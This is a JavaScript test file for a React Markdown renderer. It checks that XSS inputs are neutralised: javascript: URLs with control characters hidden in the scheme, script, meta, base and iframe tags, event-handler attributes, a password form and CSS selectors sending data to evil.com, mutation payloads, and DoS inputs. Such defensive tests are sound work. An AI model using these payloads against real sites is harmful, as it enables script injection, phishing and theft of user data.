import $ from "react-test";
import Markdown from "./index";

// ==========================================================================
// Group 1: URL scheme bypass via whitespace and control chars in scheme
// Browsers strip \t \n \r \f \v and NUL from URL schemes before evaluating.
// ==========================================================================

it("blocks javascript: with tab inside scheme", () => {
  const a = $(<Markdown>{"[x](java\tscript:alert(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with carriage return inside scheme", () => {
  // \r is a line terminator in JS regex (. doesn't match it) — link is not
  // even parsed. Accept either "#" or no link at all; both are safe.
  const root = $(<Markdown>{"[x](java\rscript:alert(1))"}</Markdown>);
  const a = root.find("a");
  if (a.length > 0) expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with form feed in scheme", () => {
  const a = $(<Markdown>{"[x](java\fscript:alert(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with vertical tab in scheme", () => {
  const a = $(<Markdown>{"[x](java\x0Bscript:alert(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with NUL byte in scheme", () => {
  const a = $(<Markdown>{"[x](java\x00script:alert(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with leading control chars", () => {
  const a = $(<Markdown>{"[x](\t javascript:alert(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks javascript: with multiple control chars sprinkled in scheme", () => {
  const a = $(
    <Markdown>{"[x](j\x01a\x02v\x03a\x04script:alert(1))"}</Markdown>,
  ).find("a");
  expect(a.attr("href")).toBe("#");
});

it("blocks data: URL with control chars in scheme (img)", () => {
  const img = $(
    <Markdown>{"![x](da\tta:text/html,<script>alert(1)</script>)"}</Markdown>,
  ).find("img");
  expect(img.attr("src")).toBe("#");
});

it("blocks vbscript: URL with control chars (link)", () => {
  const a = $(<Markdown>{"[x](vb\tscript:msgbox(1))"}</Markdown>).find("a");
  expect(a.attr("href")).toBe("#");
});

// ==========================================================================
// Group 2: Image src bypass attempts
// ==========================================================================

it("blocks javascript: in image src with tab", () => {
  const img = $(<Markdown>{"![x](java\tscript:alert(1))"}</Markdown>).find(
    "img",
  );
  expect(img.attr("src")).toBe("#");
});

it("blocks data:text/html in image src", () => {
  const img = $(
    <Markdown>{"![x](data:text/html,<svg/onload=alert(1)>)"}</Markdown>,
  ).find("img");
  expect(img.attr("src")).toBe("#");
});

// ==========================================================================
// Group 3: Reflected XSS via link/image alt text
// React text-content escaping should prevent injection.
// ==========================================================================

it("escapes HTML in link text", () => {
  const root = $(
    <Markdown>{"[<script>alert(1)</script>](https://example.com)"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in image alt", () => {
  const root = $(
    <Markdown>{"![<script>x</script>](https://example.com/x.png)"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
  expect(root.find("img").attr("alt")).toContain("<script>");
});

it("escapes HTML in heading text", () => {
  const root = $(<Markdown>{"# <script>alert(1)</script>"}</Markdown>);
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in list items", () => {
  const root = $(<Markdown>{"- <script>alert(1)</script>"}</Markdown>);
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in ordered list items", () => {
  const root = $(<Markdown>{"1. <script>alert(1)</script>"}</Markdown>);
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in table cells", () => {
  const root = $(
    <Markdown>{"| h |\n|---|\n| <script>alert(1)</script> |"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in blockquote", () => {
  const root = $(<Markdown>{"> <script>alert(1)</script>"}</Markdown>);
  expect(root.find("script").length).toBe(0);
});

it("escapes HTML in callout body", () => {
  const root = $(
    <Markdown>{"> [!NOTE]\n> <script>alert(1)</script>"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

// ==========================================================================
// Group 4: Code block / inline code (no rawHtml) — never inject HTML
// ==========================================================================

it("does not inject HTML from fenced code with html lang", () => {
  const root = $(
    <Markdown>{"```html\n<script>alert(1)</script>\n```"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("does not inject SVG from fenced code", () => {
  const root = $(
    <Markdown>{"```\n<svg onload=alert(1)></svg>\n```"}</Markdown>,
  );
  expect(root.find("svg").length).toBe(0);
});

it("does not inject HTML in indented code block with multiple payloads", () => {
  const root = $(
    <Markdown>{"    <iframe src=javascript:alert(1)></iframe>"}</Markdown>,
  );
  expect(root.find("iframe").length).toBe(0);
  expect(root.find("pre").length).toBe(1);
});

// ==========================================================================
// Group 5: rawHtml — always-blocked dangerous tags (regardless of allowlist)
// ==========================================================================

it("blocks <script> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<script>alert(1)</script>"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("blocks <script> even when explicitly listed in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ script: [] }}>{"<script>alert(1)</script>"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("blocks <meta> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<meta http-equiv="refresh" content="0;url=https://evil.com" />'}
    </Markdown>,
  );
  expect(root.find("meta").length).toBe(0);
});

it("blocks <base> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<base href="https://evil.com/" />'}</Markdown>,
  );
  expect(root.find("base").length).toBe(0);
});

it("blocks <link> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<link rel="stylesheet" href="https://evil.com/x.css" />'}
    </Markdown>,
  );
  expect(root.find("link").length).toBe(0);
});

it("blocks <frame> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<frame src="javascript:alert(1)" />'}</Markdown>,
  );
  expect(root.find("frame").length).toBe(0);
});

it("blocks <frameset> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<frameset><frame /></frameset>"}</Markdown>,
  );
  expect(root.find("frameset").length).toBe(0);
});

it("blocks <applet> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<applet code=Evil.class></applet>"}</Markdown>,
  );
  expect(root.find("applet").length).toBe(0);
});

// ==========================================================================
// Group 6: rawHtml — dangerous attributes always stripped
// ==========================================================================

it("strips srcdoc on iframe even with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<iframe srcdoc="<script>alert(1)</script>"></iframe>'}
    </Markdown>,
  );
  const ifr = root.find("iframe");
  if (ifr.length > 0) {
    expect(ifr.attr("srcdoc")).toBe(null);
  }
  expect(root.find("script").length).toBe(0);
});

it("strips srcdoc even when explicitly in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ iframe: ["srcdoc"] }}>
      {'<iframe srcdoc="<script>alert(1)</script>"></iframe>'}
    </Markdown>,
  );
  const ifr = root.find("iframe");
  if (ifr.length > 0) {
    expect(ifr.attr("srcdoc")).toBe(null);
  }
});

it("strips formaction with javascript: even with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<button formaction="javascript:alert(1)">go</button>'}
    </Markdown>,
  );
  const btn = root.find("button");
  expect(btn.attr("formaction")).toBe(null);
});

it("strips object's data attr with javascript: URL", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<object data="javascript:alert(1)"></object>'}
    </Markdown>,
  );
  const obj = root.find("object");
  expect(obj.attr("data")).toBe(null);
});

it("strips form action with javascript:", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<form action="javascript:alert(1)"><input /></form>'}
    </Markdown>,
  );
  const form = root.find("form");
  expect(form.attr("action")).toBe(null);
});

it("strips poster with javascript: on video", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<video poster="javascript:alert(1)"></video>'}
    </Markdown>,
  );
  const video = root.find("video");
  expect(video.attr("poster")).toBe(null);
});

it("strips background with javascript: (legacy attr)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<table background="javascript:alert(1)"></table>'}
    </Markdown>,
  );
  const table = root.find("table");
  expect(table.attr("background")).toBe(null);
});

// ==========================================================================
// Group 7: rawHtml — event handler bypass attempts
// ==========================================================================

it("strips onclick attr (no quotes)", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<a onclick=alert(1)>click</a>"}</Markdown>,
  );
  expect(root.find("a").attr("onclick")).toBe(null);
});

it("strips onmouseover attr (single quotes)", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<a onmouseover='alert(1)'>x</a>"}</Markdown>,
  );
  expect(root.find("a").attr("onmouseover")).toBe(null);
});

it("strips ONCLICK attr (uppercase)", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<a ONCLICK="alert(1)">x</a>'}</Markdown>,
  );
  expect(root.find("a").attr("onclick")).toBe(null);
  expect(root.find("a").attr("ONCLICK")).toBe(null);
});

it("strips onbegin (SVG animate event)", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<animate onbegin="alert(1)" />'}</Markdown>,
  );
  expect(root.find("animate").attr("onbegin")).toBe(null);
});

it("strips onload, onerror, onfocus on multiple elements", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {
        "<svg onload=alert(1)><img onerror=alert(2) /><input onfocus=alert(3) /></svg>"
      }
    </Markdown>,
  );
  // No event handlers should be present
  expect(root.find("svg").attr("onload")).toBe(null);
});

// ==========================================================================
// Group 8: rawHtml — tag bypass via malformed input
// ==========================================================================

it("does not parse <svg/onload=alert(1)> as a tag (no whitespace before attrs)", () => {
  const root = $(<Markdown rawHtml={true}>{"<svg/onload=alert(1)>"}</Markdown>);
  // Either not parsed (rendered as text) or parsed without onload
  const svg = root.find("svg");
  if (svg.length > 0) {
    expect(svg.attr("onload")).toBe(null);
  }
});

it("blocks attempts to spoof tag names with weird chars", () => {
  // Cyrillic 's' looks like Latin 's' but is U+0455
  const root = $(
    <Markdown rawHtml={true}>{"<\u0455cript>alert(1)</\u0455cript>"}</Markdown>,
  );
  // Should not be matched as a script tag (regex is ASCII-only)
  expect(root.find("script").length).toBe(0);
});

it("blocks <script> with attributes", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<script src="https://evil.com/x.js"></script>'}
    </Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("blocks self-closing script", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<script src="https://evil.com/x.js" />'}
    </Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

// ==========================================================================
// Group 9: rawHtml — XSS via inline image tag
// ==========================================================================

it("strips onerror on img tag (rawHtml=true)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<img src="https://example.com/x.png" onerror="alert(1)" />'}
    </Markdown>,
  );
  const img = root.find("img");
  expect(img.attr("onerror")).toBe(null);
  expect(img.attr("src")).toBe("https://example.com/x.png");
});

it("strips javascript: on img src", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<img src="javascript:alert(1)" />'}</Markdown>,
  );
  expect(root.find("img").attr("src")).toBe(null);
});

// ==========================================================================
// Group 10: rawHtml — anchor href injection
// ==========================================================================

it("strips javascript: href on rawHtml anchor (mixed case)", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<a href="JAVASCRIPT:alert(1)">x</a>'}</Markdown>,
  );
  expect(root.find("a").attr("href")).toBe(null);
});

it("strips javascript: href with whitespace inside scheme on rawHtml anchor", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="java\tscript:alert(1)">x</a>'}
    </Markdown>,
  );
  expect(root.find("a").attr("href")).toBe(null);
});

it("strips data:text/html href on rawHtml anchor", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="data:text/html,<script>alert(1)</script>">x</a>'}
    </Markdown>,
  );
  expect(root.find("a").attr("href")).toBe(null);
});

// ==========================================================================
// Group 11: rawHtml — content inside dangerous tag should not execute
// ==========================================================================

it("blocked tag preserves content as text (not executed)", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<script>alert(1)</script>"}</Markdown>,
  );
  expect(root.find("script").length).toBe(0);
  // The text content should appear somewhere as literal
  expect(root.text()).toContain("alert(1)");
});

it("svg with nested script — script blocked, svg may render empty", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<svg><script>alert(1)</script></svg>"}
    </Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

// ==========================================================================
// Group 12: Without rawHtml — no HTML tags should ever render
// ==========================================================================

it("never renders div without rawHtml", () => {
  const root = $(<Markdown>{'<div class="x">hi</div>'}</Markdown>);
  expect(root.find("div.x").length).toBe(0);
});

it("never renders span without rawHtml", () => {
  const root = $(<Markdown>{"<span>x</span>"}</Markdown>);
  expect(root.find("span").length).toBe(0);
});

it("never renders iframe without rawHtml", () => {
  const root = $(
    <Markdown>{"<iframe src=https://evil.com></iframe>"}</Markdown>,
  );
  expect(root.find("iframe").length).toBe(0);
});

// ==========================================================================
// Group 13: Markdown autolink doesn't allow scheme bypass
// ==========================================================================

it("autolinks only http/https — no javascript: scheme", () => {
  const root = $(<Markdown>{"javascript:alert(1)"}</Markdown>);
  expect(root.find("a").length).toBe(0);
});

it("autolinks only http/https — no data: scheme", () => {
  const root = $(
    <Markdown>{"data:text/html,<script>alert(1)</script>"}</Markdown>,
  );
  expect(root.find("a").length).toBe(0);
});

// ==========================================================================
// Group 14: Mutation/double-injection attempts
// ==========================================================================

it("does not allow tag-in-tag injection: <<script>script>", () => {
  // If we naively strip <script>, we might leave <script>alert(1)</script>
  const root = $(
    <Markdown rawHtml={true}>
      {"<<script>script>alert(1)<</script>/script>"}
    </Markdown>,
  );
  expect(root.find("script").length).toBe(0);
});

it("does not allow content with closing tag mismatched", () => {
  const root = $(<Markdown rawHtml={true}>{"<script>alert(1)</p>"}</Markdown>);
  expect(root.find("script").length).toBe(0);
});

// ==========================================================================
// Group 15: Boolean attrs and unusual inputs don't cause issues
// ==========================================================================

it("renders boolean attributes safely on allowlisted tags", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<details open><summary>title</summary></details>"}
    </Markdown>,
  );
  const details = root.find("details");
  expect(details.length).toBe(1);
  expect(details.attr("open")).not.toBeNull();
});

it("blocks <input> with rawHtml={true} — not in default allowlist", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<input disabled hidden />"}</Markdown>,
  );
  expect(root.find("input").length).toBe(0);
});

it("handles empty allowlist {} (allows nothing)", () => {
  const root = $(
    <Markdown rawHtml={{}}>{'<span class="x">hi</span>'}</Markdown>,
  );
  expect(root.find("span").length).toBe(0);
});

it("handles empty attr list [] (tag allowed but no attrs)", () => {
  const root = $(
    <Markdown rawHtml={{ span: [] }}>
      {'<span class="x" id="y">hi</span>'}
    </Markdown>,
  );
  const span = root.find("span");
  expect(span.length).toBe(1);
  expect(span.attr("class")).toBe(null);
  expect(span.attr("id")).toBe(null);
});

// ==========================================================================
// Group 16: DoS / complexity attacks (must not hang)
// ==========================================================================

it("handles very long input without hanging (100k chars)", () => {
  const long = "a".repeat(100_000);
  const root = $(<Markdown>{long}</Markdown>);
  expect(root.find("p").length).toBe(1);
});

it("handles many opening brackets without hanging", () => {
  const input = "[".repeat(1000);
  const root = $(<Markdown>{input}</Markdown>);
  expect(root.find("p").length).toBe(1);
});

it("handles many opening tildes without hanging", () => {
  const input = "~".repeat(1000);
  const root = $(<Markdown>{input}</Markdown>);
  // Just ensure it terminates
  expect(root.length).toBe(1);
});

// ==========================================================================
// Group 17: Expanded blocked tags — CSS injection, embedding, phishing
// ==========================================================================

it("blocks <style> tag with rawHtml={true} (CSS injection / data exfiltration)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<style>input[value^='a']{background:url(https://evil.com/a)}</style>"}
    </Markdown>,
  );
  expect(root.find("style").length).toBe(0);
});

it("blocks <style> tag even when explicitly in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ style: [] }}>
      {"<style>body{color:red}</style>"}
    </Markdown>,
  );
  expect(root.find("style").length).toBe(0);
});

it("blocks <iframe> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<iframe src="https://evil.com"></iframe>'}
    </Markdown>,
  );
  expect(root.find("iframe").length).toBe(0);
});

it("blocks <iframe> even when explicitly in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ iframe: ["src"] }}>
      {'<iframe src="https://evil.com"></iframe>'}
    </Markdown>,
  );
  expect(root.find("iframe").length).toBe(0);
});

it("blocks <object> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<object data="https://evil.com/x.swf"></object>'}
    </Markdown>,
  );
  expect(root.find("object").length).toBe(0);
});

it("blocks <embed> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<embed src="https://evil.com/x.swf" />'}
    </Markdown>,
  );
  expect(root.find("embed").length).toBe(0);
});

it("blocks <noscript> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<noscript><img src=x onerror=alert(1)></noscript>"}
    </Markdown>,
  );
  expect(root.find("noscript").length).toBe(0);
});

it("blocks <template> tag with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<template><script>alert(1)</script></template>"}
    </Markdown>,
  );
  expect(root.find("template").length).toBe(0);
});

it("blocks <form> tag with rawHtml={true} (phishing)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<form action="https://evil.com"><input name="password" /></form>'}
    </Markdown>,
  );
  expect(root.find("form").length).toBe(0);
});

// ==========================================================================
// Group 18: style attribute blocked (CSS injection / data exfiltration)
// ==========================================================================

it("strips style attribute on span even with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<span style="color:red">text</span>'}</Markdown>,
  );
  const span = root.find("span");
  expect(span.length).toBe(1);
  expect(span.attr("style")).toBe(null);
});

it("strips style attribute even when explicitly listed in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ span: ["style"] }}>
      {'<span style="color:red">text</span>'}
    </Markdown>,
  );
  const span = root.find("span");
  expect(span.length).toBe(1);
  expect(span.attr("style")).toBe(null);
});

it("strips style attribute with CSS expression payload", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<div style="background:url(javascript:alert(1))">x</div>'}
    </Markdown>,
  );
  expect(root.find("div").attr("style")).toBe(null);
});

// ==========================================================================
// Group 19: ping attribute blocked (tracker beacon on clicks)
// ==========================================================================

it("strips ping attribute on anchor with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="https://example.com" ping="https://tracker.com">click</a>'}
    </Markdown>,
  );
  const a = root.find("a");
  expect(a.length).toBe(1);
  expect(a.attr("ping")).toBe(null);
  expect(a.attr("href")).toBe("https://example.com");
});

it("strips ping attribute even when explicitly listed in allowlist", () => {
  const root = $(
    <Markdown rawHtml={{ a: ["href", "ping"] }}>
      {'<a href="https://example.com" ping="https://tracker.com">click</a>'}
    </Markdown>,
  );
  const a = root.find("a");
  expect(a.attr("ping")).toBe(null);
});

// ==========================================================================
// Group 20: Math DoS — deeply nested braces must not stack overflow
// ==========================================================================

it("handles deeply nested math braces without stack overflow", () => {
  const nested = "{".repeat(200) + "x" + "}".repeat(200);
  expect(() =>
    $(<Markdown math={(tex) => <span>{tex}</span>}>{`$${nested}$`}</Markdown>),
  ).not.toThrow();
});

it("handles pathological math input (1000 nested brace pairs)", () => {
  const nested = "{".repeat(1000) + "x" + "}".repeat(1000);
  expect(() =>
    $(<Markdown math={(tex) => <span>{tex}</span>}>{`$${nested}$`}</Markdown>),
  ).not.toThrow();
});

// ==========================================================================
// Group 21: rawHtml={true} uses allowlist — unknown tags don't render
// The allowlist approach means future browser features can't slip through.
// ==========================================================================

it("blocks <canvas> with rawHtml={true} (not in default allowlist)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {"<canvas width=300 height=150></canvas>"}
    </Markdown>,
  );
  expect(root.find("canvas").length).toBe(0);
});

it("blocks <dialog> with rawHtml={true} (not in default allowlist)", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<dialog open>hello</dialog>"}</Markdown>,
  );
  expect(root.find("dialog").length).toBe(0);
});

it("blocks <svg> with rawHtml={true} (not in default allowlist)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<svg><circle cx="50" cy="50" r="40" /></svg>'}
    </Markdown>,
  );
  expect(root.find("svg").length).toBe(0);
});

it("blocks <marquee> with rawHtml={true} (not in default allowlist)", () => {
  const root = $(
    <Markdown rawHtml={true}>{"<marquee>scroll</marquee>"}</Markdown>,
  );
  expect(root.find("marquee").length).toBe(0);
});

it("renders allowlisted tags normally with rawHtml={true}", () => {
  const root = $(
    <Markdown rawHtml={true}>{"text <mark>highlighted</mark> here"}</Markdown>,
  );
  expect(root.find("mark").length).toBe(1);
  expect(root.find("mark").text()).toBe("highlighted");
});

it("renders allowlisted media tag with rawHtml={true}, URL sanitized", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<img src="https://example.com/photo.jpg" alt="photo" />'}
    </Markdown>,
  );
  const img = root.find("img");
  expect(img.length).toBe(1);
  expect(img.attr("src")).toBe("https://example.com/photo.jpg");
});

it("blocks img with javascript: src even when tag is allowlisted", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<img src="javascript:alert(1)" alt="x" />'}
    </Markdown>,
  );
  const img = root.find("img");
  expect(img.attr("src")).toBe(null);
});

// ==========================================================================
// Group 22: Residual attack surface analysis with the allowlist model
// These document what IS allowed and confirm it is safe.
// ==========================================================================

it("data-* attributes on allowlisted tags pass through safely", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<span data-value="42">text</span>'}</Markdown>,
  );
  expect(root.find("span").attr("data-value")).toBe("42");
});

it("class and id attributes pass through on allowlisted tags", () => {
  const root = $(
    <Markdown rawHtml={true}>{'<p class="lead" id="intro">text</p>'}</Markdown>,
  );
  const p = root.find("p");
  expect(p.attr("class")).toBe("lead");
  expect(p.attr("id")).toBe("intro");
});

it("adds rel=noopener noreferrer to target=_blank anchors", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="https://example.com" target="_blank">link</a>'}
    </Markdown>,
  );
  const a = root.find("a");
  expect(a.attr("target")).toBe("_blank");
  expect(a.attr("rel")).toContain("noopener");
  expect(a.attr("rel")).toContain("noreferrer");
});

it("merges noopener into existing rel on target=_blank", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="https://example.com" target="_blank" rel="nofollow">link</a>'}
    </Markdown>,
  );
  const rel = root.find("a").attr("rel");
  expect(rel).toContain("nofollow");
  expect(rel).toContain("noopener");
  expect(rel).toContain("noreferrer");
});

it("does not add rel to anchors without target=_blank", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="https://example.com">link</a>'}
    </Markdown>,
  );
  expect(root.find("a").attr("rel")).toBe(null);
});

it("download attribute on <a> passes through (triggers download, not code)", () => {
  const root = $(
    <Markdown rawHtml={true}>
      {'<a href="https://example.com/file.pdf" download>file</a>'}
    </Markdown>,
  );
  expect(root.find("a").attr("download")).not.toBeNull();
});
